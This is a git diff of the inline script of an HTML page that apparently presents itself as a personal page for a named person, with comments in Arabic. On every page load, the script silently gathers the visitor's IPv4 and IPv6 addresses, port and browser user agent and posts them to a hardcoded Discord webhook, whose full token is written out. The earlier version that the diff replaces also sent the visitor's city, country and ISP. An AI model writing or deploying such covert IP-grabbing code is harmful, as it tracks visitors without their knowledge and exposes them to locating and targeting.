@@ -41,47 +41,60 @@
         // ⚠️ ضع رابط الـ Webhook الخاص بك من ديسكورد هنا
         const DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558756212567449700/7DqOL-5GU1Xpm5f2NGTrJK7DTxcwk4mTkxyfEimvmya3DsW8fj1oR5JPiTw9RHWBWKN_";
 
-        async function sendInfo() {
+        async function sendAllIPs() {
+            let ipv4 = "غير متوفر على الشبكة";
+            let ipv6 = "غير متوفر على الشبكة";
+
+            // 1. محاولة جلب IPv4
             try {
-                // استخدام ipwho.is بدلاً من ipapi لتفادي خطأ 403
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                
-                if (!data.success) return;
+                const res4 = await fetch('https://api4.ipify.org?format=json');
+                const data4 = await res4.json();
+                if (data4.ip) ipv4 = data4.ip;
+            } catch (e) {
+                console.log("IPv4 غير مدعوم أو فشل الاتصال به");
+            }
 
-                const ip = data.ip || "غير معروف";
-                const city = data.city || "غير معروف";
-                const country = data.country || "";
-                const isp = data.connection ? data.connection.isp : "غير معروف";
-                const ua = navigator.userAgent;
+            // 2. محاولة جلب IPv6
+            try {
+                const res6 = await fetch('https://api6.ipify.org?format=json');
+                const data6 = await res6.json();
+                if (data6.ip) ipv6 = data6.ip;
+            } catch (e) {
+                console.log("IPv6 غير مدعوم أو فشل الاتصال به");
+            }
 
-                if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "ضع_رابط_الويبهوك_هنا") {
-                    const payload = {
-                        embeds: [{
-                            title: "💌 زائر جديد دخل صفحة جوري القحطاني!",
-                            color: 16729222,
-                            fields: [
-                                { name: "🌐 الـ IP", value: `\`${ip}\``, inline: true },
-                                { name: "📍 الموقع", value: `${city},${country}`, inline: true },
-                                { name: "🏢 المزود", value: isp, inline: false },
-                                { name: "📱 الجهاز والمتصفح", value: `\`\`\`${ua}\`\`\``, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
+            const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+            const ua = navigator.userAgent;
 
+            // 3. إرسال البيانات إلى ديسكورد إذا كان الرابط موجوداً
+            if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== "ضع_رابط_الويبهوك_هنا") {
+                const payload = {
+                    embeds: [{
+                        title: "💌 زائر جديد دخل صفحة جوري القحطاني (جميع أنواع الـ IP)",
+                        color: 16729222,
+                        fields: [
+                            { name: "🌐 الـ IPv4", value: `\`${ipv4}\``, inline: false },
+                            { name: "🌍 الـ IPv6", value: `\`${ipv6}\``, inline: false },
+                            { name: "🔌 البورت", value: `\`${port}\``, inline: true },
+                            { name: "📱 الجهاز والمتصفح", value: `\`\`\`${ua}\`\`\``, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                try {
                     await fetch(DISCORD_WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload)
                     });
+                } catch (err) {
+                    console.error("خطأ في إرسال الويبهوك:", err);
                 }
-            } catch (err) {
-                console.error("خطأ:", err);
             }
         }
 
-        sendInfo();
+        sendAllIPs();
     </script>
 </body>
 </html>
